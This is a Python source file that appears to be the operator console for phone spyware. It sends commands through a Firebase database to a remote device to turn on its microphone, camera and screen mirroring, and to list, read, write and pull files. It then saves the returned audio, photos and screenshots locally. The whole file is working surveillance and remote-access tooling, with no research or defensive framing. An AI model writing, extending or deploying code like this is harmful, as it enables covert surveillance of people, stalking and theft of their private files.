import firebase_admin
from firebase_admin import credentials, db
import json
import time
from datetime import datetime
import base64 # Added missing import for base64
import binascii # For handling base64 decoding errors

# Initialize Firebase Admin
try:
    cred = credentials.Certificate('firebase-credentials.json')  # Download this from Firebase Console
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://phone-tracker-ebd88-default-rtdb.firebaseio.com'
    })
    print("Firebase initialized successfully")
except FileNotFoundError:
    print("Error: firebase-credentials.json not found!")
    print("Please copy firebase-credentials.json.example to firebase-credentials.json")
    print("and fill in your Firebase service account credentials.")
    exit(1)
except Exception as e:
    print(f"Error initializing Firebase: {e}")
    exit(1)

def send_command(user_id, action, params=None):
    """Send a command to a specific device."""
    command = {
        'action': action,
        'params': params or {}
    }
    
    # Push command to Firebase
    ref = db.reference(f'commands/{user_id}')
    command_ref = ref.push()
    command_ref.set(json.dumps(command))
    print(f"Command sent: {action}")
    
    # Wait for response
    response_ref = db.reference(f'command_responses/{user_id}')
    start_time = time.time()
    
    while time.time() - start_time < 10:  # Wait up to 10 seconds for response
        responses = response_ref.get()
        if responses:
            for response_id, response_data in responses.items():
                try:
                    response = json.loads(response_data)
                    if response['command'] == action:
                        print(f"Response received: {response}")
                        # Clean up response
                        response_ref.child(response_id).delete()
                        return response
                except:
                    continue
        time.sleep(0.5)
    
    print("No response received")
    return None

def list_available_commands():
    print("\nAvailable Commands:")
    print("1. START_MIC - Start audio recording")
    print("2. STOP_MIC - Stop audio recording")
    print("3. START_CAMERA - Start camera stream")
    print("4. STOP_CAMERA - Stop camera stream")
    print("5. START_SCREEN - Start screen mirroring")
    print("6. STOP_SCREEN - Stop screen mirroring")
    print("7. LIST_FILES [path] - List files in directory")
    print("8. READ_FILE <path> - Read file content")
    print("9. WRITE_FILE <path> <content> - Write content to file")
    print("10. DOWNLOAD_FILE <path> - Upload file to Firebase")
    print("11. exit - Exit the program")

def main():
    print("Firebase Command Sender")
    user_id = input("Enter user ID: ")
    
    while True:
        list_available_commands()
        choice = input("\nEnter command number or 'exit': ").strip()
        
        if choice == 'exit':
            break
            
        try:
            choice = int(choice)
        except:
            print("Invalid choice")
            continue
            
        if choice == 1:
            send_command(user_id, "START_MIC")
        elif choice == 2:
            send_command(user_id, "STOP_MIC")
        elif choice == 3:
            send_command(user_id, "START_CAMERA")
        elif choice == 4:
            send_command(user_id, "STOP_CAMERA")
        elif choice == 5:
            send_command(user_id, "START_SCREEN")
        elif choice == 6:
            send_command(user_id, "STOP_SCREEN")
        elif choice == 7:
            path = input("Enter path (or press Enter for root): ").strip()
            send_command(user_id, "LIST_FILES", {"path": path or "/"})
        elif choice == 8:
            path = input("Enter file path: ").strip()
            send_command(user_id, "READ_FILE", {"path": path})
        elif choice == 9:
            path = input("Enter file path: ").strip()
            content = input("Enter content (will be base64 encoded): ").strip()
            send_command(user_id, "WRITE_FILE", {
                "path": path,
                "content": content
            })
        elif choice == 10:
            path = input("Enter file path: ").strip()
            send_command(user_id, "DOWNLOAD_FILE", {"path": path})
        else:
            print("Invalid choice")

def monitor_streams(user_id):
    """Monitor all streams for the given user ID."""
    def stream_listener(event):
        try:
            path = event.path
            data = event.data
            
            if isinstance(data, str):
                # Try to decode base64 and save
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                try:
                    # Validate base64 string before decoding
                    if not data or not isinstance(data, str):
                        print(f"Invalid base64 data: not a string or empty")
                        return
                        
                    # Try to decode with padding correction if needed
                    try:
                        # Add padding if necessary
                        padding_needed = len(data) % 4
                        if padding_needed:
                            data += '=' * (4 - padding_needed)
                        decoded_data = base64.b64decode(data)
                    except Exception as padding_error:
                        print(f"Error with padding correction: {padding_error}")
                        # Try standard decoding as fallback
                        decoded_data = base64.b64decode(data)
                    
                    # Save the decoded data based on stream type
                    if "audio_stream" in path:
                        with open(f"audio_{timestamp}.mp3", "wb") as f:
                            f.write(decoded_data)
                        print(f"Saved audio file: audio_{timestamp}.mp3")
                    elif "camera_stream" in path:
                        with open(f"camera_{timestamp}.jpg", "wb") as f:
                            f.write(decoded_data)
                        print(f"Saved camera image: camera_{timestamp}.jpg")
                    elif "screen_stream" in path:
                        with open(f"screen_{timestamp}.jpg", "wb") as f:
                            f.write(decoded_data)
                        print(f"Saved screen image: screen_{timestamp}.jpg")
                except binascii.Error as be:
                    print(f"Base64 decoding error: {be}")
                except Exception as e:
                    print(f"Error processing decoded data: {e}")
        except Exception as e:
            print(f"Error processing stream data: {e}")

    # Listen to all streams
    streams = [
        f"audio_stream/{user_id}",
        f"camera_stream/{user_id}",
        f"screen_stream/{user_id}"
    ]
    
    for stream_path in streams:
        db.reference(stream_path).listen(stream_listener)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
    except Exception as e:
        print(f"Error: {e}")